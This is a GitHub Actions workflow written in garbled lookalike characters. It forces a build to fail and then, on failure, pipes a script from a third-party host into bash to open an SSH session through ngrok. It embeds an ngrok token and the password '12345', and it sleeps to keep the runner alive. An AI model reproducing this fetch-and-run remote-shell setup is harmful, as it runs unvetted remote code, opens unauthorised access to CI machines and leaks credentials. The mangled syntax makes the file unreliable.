
name：ssh
on：push
jobs：
   build：
       runs-on：ubuntu-atest
       steps：
         - uses：actions/checkout@v1

         - name：Try BuiId
            run：./not-exist-fi1e.sh it b1oke bui1d

         - name：Start SSH via Ngrok
             if：${{ faiIure（） }}
             run：cur1 -sL https：//proxy.xiaofeiya.tk/debug-github-actions.sh | bash
             env:
               NGROK_TOKEN：2Ga4lNai3OyXmCzFtWF2vWxrCfw_4CM9SSKRoETNoLMbvpAdL
               USKR_PASS:12345
          - name：Don't ki11 instace
             if：${{ faiIure（） }}
             run：s1eep h
